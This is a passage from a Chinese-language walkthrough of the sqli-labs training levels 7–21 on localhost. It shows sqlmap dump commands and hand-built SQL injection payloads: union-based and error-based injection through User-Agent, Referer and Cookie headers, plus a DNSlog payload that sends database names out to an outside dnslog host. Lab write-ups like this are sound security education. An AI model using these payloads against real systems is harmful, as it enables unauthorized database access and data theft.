<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D security <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938608.png" srcset="/img/loading.gif" lazyload></p>
<p>查看「字段」</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D security <span class="hljs-operator">-</span>T users <span class="hljs-comment">--columns</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938537.png" srcset="/img/loading.gif" lazyload></p>
<p>查看「数据」</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-7</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D security <span class="hljs-operator">-</span>T users <span class="hljs-comment">--dump</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938687.png" srcset="/img/loading.gif" lazyload></p>
<p>用工具虽然方便，但终究体现不出我们的水平，真正的安全工程师可不会是脚本小子（脱离工具就不能干事），但我们先不在这里写脚本，继续往下做题自然就需要我们具备更高的能力了。</p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p><strong>盲注：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-8</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938998.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>DNSlog注入：</strong></p>
<p>同上题</p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>盲注：不管怎么输入，总是you are in…… ，用布尔盲注的话判断不了，这种情况只能用时间盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-9</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>竟然扫出布尔盲注漏洞？</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938762.png" srcset="/img/loading.gif" lazyload></p>
<p>后续同上，经验证，可以出结果</p>
<p>DNSlog注入也能用，同上</p>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>盲注：不管怎么输入，也总是you are in……</p>
<p>时间盲注，用sqlmap</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-10</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>竟然扫不出来</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938852.png" srcset="/img/loading.gif" lazyload></p>
<p>根据这道题的题目，应该是用双引号去闭合，这个可能对sqlmap有难度</p>
<p>尝试增加测试等级level（1-5，默认是1）和风险等级risk（1-3，默认是1），把这两个都设为3，跑的时间变长不少（跑的东西也更多更细）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-10</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--level 3 --risk 3</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938642.png" srcset="/img/loading.gif" lazyload></p>
<p>出来了，剩下的就不赘述了</p>
<p>也可以用DNSlog注入，同上</p>
<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><h3 id="使用burpsuite"><a href="#使用burpsuite" class="headerlink" title="使用burpsuite"></a>使用burpsuite</h3><p>11到21关的提交方式全是post型的。对于手动注入，也可以在界面注入，但建议配合使用burpsuite、hackbar，注入会更便利；对于自动注入当然还是用sqlmap（不过我们会用burpsuite抓包并存储起来，后续会讲）。</p>
<p>这里我们优先考虑手动注入（hackbar的使用是最简单的，但在这里为啥不太好使，只好使用bp）</p>
<p>一开始是一个登录页面</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938940.png" srcset="/img/loading.gif" lazyload></p>
<p>简单尝试了一下，Username和Password都输入1，Submit后抓到包</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938386.png" srcset="/img/loading.gif" lazyload></p>
<p>然后在uname的1后面加一个单引号，点击forward放行</p>
<p>有sql注入漏洞，应该是联合查询注入与报错注入都有</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938238.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>一、联合查询注入</strong></p>
<p>经尝试，有两个字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;union select 1,2--+ and extractvalue(1,concat(0x7e,select database()))--+&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938342.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938222.png" srcset="/img/loading.gif" lazyload></p>
<p>把2所在位置替换成database()，即</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>出库</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938574.png" srcset="/img/loading.gif" lazyload></p>
<p>后续步骤没啥说的，同上</p>
<p><strong>二、报错注入</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021938415.png" srcset="/img/loading.gif" lazyload></p>
<p>后续同上</p>
<h3 id="直接在登录页面注入"><a href="#直接在登录页面注入" class="headerlink" title="直接在登录页面注入"></a>直接在登录页面注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2--+</span><br></code></pre></td></tr></table></figure>

<p>发现使username后面password有语法错误，注释不好使了？</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939743.png" srcset="/img/loading.gif" lazyload></p>
<p>Mysql除了–+之外还有种注释方法#</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2#</span><br></code></pre></td></tr></table></figure>

<p>成功登录，可能这里直接从登录页面注入的话，会把–+处理掉，而#不会受影响，用bp就没有这种影响，这也是我们更推荐用bp原因。有些前端会有过滤，用bp一定程度上可以绕过。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939245.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入显然也是可以的</p>
<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>其实最好使用bp去尝试，但这里为了偷懒，直接在登录页面注入。</p>
<p>怎么输入也没有报错，除了加载的图片LOGIN ATTEMPT FILED之外，什么也没有，然后随便输了几个，竟然报错了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot;&quot;&quot;&quot;&quot;(())))))))) #<br></code></pre></td></tr></table></figure>

<p>从password猜测username也是用’’)来闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939320.png" srcset="/img/loading.gif" lazyload></p>
<p>后来再次尝试才发现，只有输入双引号时才会报错，而且输两个单引号也不可以，发现这俩是不一样的：两个单引号’’双引号”</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>”<br></code></pre></td></tr></table></figure>

<p>这下不用猜了</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939564.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; ) union select 1,2#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939805.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入也行</p>
<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’<br></code></pre></td></tr></table></figure>

<p>可以看出是用’)闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939784.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,2#</span><br></code></pre></td></tr></table></figure>

<p>Logged in但没显示1，2，没回显位了，联合注入不行了，用报错注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939040.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and extractvalue(1,concat(0x7e,(select database())))#</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939258.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p><code>1’</code>没反应</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>”<br></code></pre></td></tr></table></figure>

<p>报错，用”闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939835.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; union select 1,2#<br></code></pre></td></tr></table></figure>

<p>   照样没东西，用报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select database())))#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939950.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’#<br></code></pre></td></tr></table></figure>

<p>只显示登录失败</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2#</span><br></code></pre></td></tr></table></figure>

<p>   显示登录成功，这样闭合和字段数都出来了</p>
<p>没有回显也没有报错，只好用DNSlog注入和盲注了，盲注就只用工具，先试试DNSlog注入。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(SELECT HEX(database())),&#x27;</span><span class="hljs-number">.2</span>icsci.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2 #</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939166.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939894.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939385.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="盲注-2"><a href="#盲注-2" class="headerlink" title="盲注"></a>盲注</h3><p>先用bp抓包</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939543.png" srcset="/img/loading.gif" lazyload></p>
<p>然后复制抓包的所有内容（uname不要有值），随便放入一个文件里，只要自己能找到，我一般习惯放在sqlmap文件夹里，比如<code>E:\Users\CTFtools\sqlmap\bp抓包\less15.txt</code>，在<code>C:\less15.txt</code>里也行。</p>
<p>post请求要用-r参数，而且使用-r参数就要像上文一样抓包写包。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939272.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less15.txt<br></code></pre></td></tr></table></figure>

<p>找到注入点</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940021.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less15.txt <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure>

<p>成功出库</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021939557.png" srcset="/img/loading.gif" lazyload></p>
<p>剩下的同上。</p>
<p>其实也可不用-r参数，不过要加上-data参数（–data命令指定payload进行注入），比如</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://localhost/sqli-labs/Less-15/?id=1&quot; <span class="hljs-comment">--batch --data “uname=admin&amp;passwd=admin&amp;submit=Submit” –dbs</span><br></code></pre></td></tr></table></figure>

<p>还是建议使用-r参数</p>
<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>也是盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less16.txt<br></code></pre></td></tr></table></figure>

<p>扫不出来</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940775.png" srcset="/img/loading.gif" lazyload></p>
<p>应该又是双引号闭合，升一下level和risk，用时还挺长</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less16.txt <span class="hljs-comment">--level 3 --risk 3</span><br></code></pre></td></tr></table></figure>

<p>成功注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940347.png" srcset="/img/loading.gif" lazyload></p>
<p>剩下的不必多说</p>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>怎么输入都没用，没有啥有用的信息，反倒是一直在嘲讽我们</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940200.png" srcset="/img/loading.gif" lazyload></p>
<p>换sqlmap扫也扫不出来，把level和risk都升到3也没用。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940503.png" srcset="/img/loading.gif" lazyload></p>
<p>查看一下源代码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940255.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940251.png" srcset="/img/loading.gif" lazyload></p>
<p>注意看下面这段代码。</p>
<p>因为只有代码中$row和$row1存在时，才能进行更新语句、返回报错，所以这里用户名一定要存在，使查询语句返回数据，而且我们不能从查询语句注入，只能从更新语句<code>UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;</code>注入，注入点应该是$passwd。</p>
<p>这样我们就明白了，<strong>username不是注入点，password才是</strong>，而且我们还要有用户名，这里应该模拟的是我们在某网站登上自己的账号后，利用修改密码来获取数据库里的其他用户数据。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940742.png" srcset="/img/loading.gif" lazyload></p>
<p>那这就好说了，我们就用之前爆出来的第一个用户Dumb。</p>
<p>试了试，联合注入不好使，但是有报错。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021940578.png" srcset="/img/loading.gif" lazyload></p>
<p>那就报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Dumb<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))#</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941087.png" srcset="/img/loading.gif" lazyload></p>
<p>出数据库了，哈哈哈，bug off you silly dumb website builder</p>
<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><h3 id="手动User-Agent注入"><a href="#手动User-Agent注入" class="headerlink" title="手动User-Agent注入"></a>手动User-Agent注入</h3><p>输入内容，没啥用，从题目来看是Header注入中的User-Agent注入，那就要从User-Agent入手了</p>
<p>这题也要在登录页面输入Dumb账户</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941748.png" srcset="/img/loading.gif" lazyload></p>
<p>抓包（带有Dumb账户），在User-Agent后加单引号，放包</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941674.png" srcset="/img/loading.gif" lazyload></p>
<p>我们在User-Agent后面加上单引号出现如下报错，可见插入语句是将User-Agent字段内容和ip地址以及账户名作为字符串进行插入且外面有括号。我们要注意U-A字段后面还有两个参数（合三个参数），所以我们在构造时候也需要有三个参数。因为我们用#号把后面（ip和账户名）都注释了。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941004.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>’,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941397.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941568.png" srcset="/img/loading.gif" lazyload></p>
<p>有报错，用报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,2,(extractvalue(1,concat(0x7e,(select database())))))#</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941559.png" srcset="/img/loading.gif" lazyload></p>
<p>如果我们不写上三个参数，SQL语句不会执行</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941495.png" srcset="/img/loading.gif" lazyload></p>
<p>我们其实还有种方法，因为U-A后面还有两个参数，我们肯定不能直接用–+或#去注释掉，但是我们可以用别的注释方法，比如下面这条，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()))) and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>写入这条语句后，实际语句就是……’Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko&#x2F;20100101 Firefox&#x2F;129.0’ and extractvalue(1,concat(0x7e,(select database()))) and ‘1’&#x3D;’1’……，注意前后都加的单引号，这样一看，语句没毛病啊。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941772.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="自动U-A注入"><a href="#自动U-A注入" class="headerlink" title="自动U-A注入"></a>自动U-A注入</h3><p>下面到了sqlmap环节</p>
<p>抓包，在http请求头的user-agent内容后面加上一个*号，写入txt，</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941633.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less18.txt<br></code></pre></td></tr></table></figure>

<p>这个问题答yes（当然也可以在写命令指令的时候加上相应参数）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941211.png" srcset="/img/loading.gif" lazyload></p>
<p>其他问题看情况随便答答，稍等一会</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941791.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><h3 id="手动Referer注入"><a href="#手动Referer注入" class="headerlink" title="手动Referer注入"></a>手动Referer注入</h3><p>看题目就知道，是Header注入中的referer注入，</p>
<p>还是像之前一样，输入Dumb，抓包，记得在referer后面加单引号，</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941172.png" srcset="/img/loading.gif" lazyload></p>
<p>有报错，用报错注入，注意有两个参数</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941449.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="自动Referer注入"><a href="#自动Referer注入" class="headerlink" title="自动Referer注入"></a>自动Referer注入</h3><p>抓包，写包，在Referer后面加*</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941830.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less19.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941909.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less19.txt <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021941634.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><h3 id="手动cookie注入"><a href="#手动cookie注入" class="headerlink" title="手动cookie注入"></a>手动cookie注入</h3><p>登录，这么多回显，似乎有很多注入方法，尝试过后，只有cookie注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942302.png" srcset="/img/loading.gif" lazyload></p>
<p>抓包，Cookie后加单引号</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942838.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942234.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))#</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942295.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="自动Cookie注入"><a href="#自动Cookie注入" class="headerlink" title="自动Cookie注入"></a>自动Cookie注入</h3><p>抓包，写包（会抓到很多包，不要抓错了，参考下图），在cookie后面加*</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942837.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\<span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942226.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>一样是cookie注入，抓包，从格式看cookie应该是经过base64编码过了（base64是一种基础的编码方式）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942407.png" srcset="/img/loading.gif" lazyload></p>
<p>找个<strong>Base64 在线工具</strong><a target="_blank" rel="noopener" href="https://base64.us/" title="Base64 在线编码解码 | Base64 加密解密 - Base64.us">Base64 在线编码解码 | Base64 加密解密 - Base64.us</a></p>
